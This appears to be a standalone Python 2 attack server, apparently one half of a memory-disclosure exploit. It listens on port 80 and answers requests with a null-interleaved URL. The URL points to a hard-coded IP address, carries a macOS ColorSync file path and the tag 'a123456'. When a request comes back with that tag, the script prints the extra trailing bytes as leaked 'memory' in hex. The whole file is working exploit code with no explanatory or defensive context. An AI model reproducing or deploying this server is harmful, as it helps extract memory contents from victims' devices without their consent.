import socket

def listen():
    connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    connection.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    connection.bind(('0.0.0.0', 80))
    connection.listen(10)
    while True:
        current_connection, address = connection.accept()
        while True:
            data = current_connection.recv(2048)

            if data == 'quit\r\n':
                current_connection.shutdown(1)
                current_connection.close()
                break

            elif data == 'stop\r\n':
                current_connection.shutdown(1)
                current_connection.close()
                exit()

            elif data:
                #print data
                if(data.find("a123456") !=-1):
                    #print data
                    start = data.find("GET")
                    end = data.find("HTTP")
                    str1 = data[start+4 :end-1]
                    l = str1.decode('utf-8').encode('utf-16le')
                    print ("memory" + str(len(l[65*2:])) + "bytes")
                    for i in l[65*2:]:
                        print (hex(ord(i))),
                    print ("")
                    print (l[65*2:])
                u = "http://157.230.241.64//System/Library/ColorSync/Resources/ColorTables.data?val=a123456"
                w = ""
                for item in u:
                    w = w +item
                    w = w + "\x00"
                current_connection.send("HTTP/1.1 200 OK\r\nContent-Length: "+str(len(w))+"\r\nContent-Type: text/html\r\nConnection: Closed\r\n\r\n"+ w +"\r\n")
                current_connection.shutdown(1)
                current_connection.close()
                break


if __name__ == "__main__":
    try:
        listen()
    except KeyboardInterrupt:
        pass
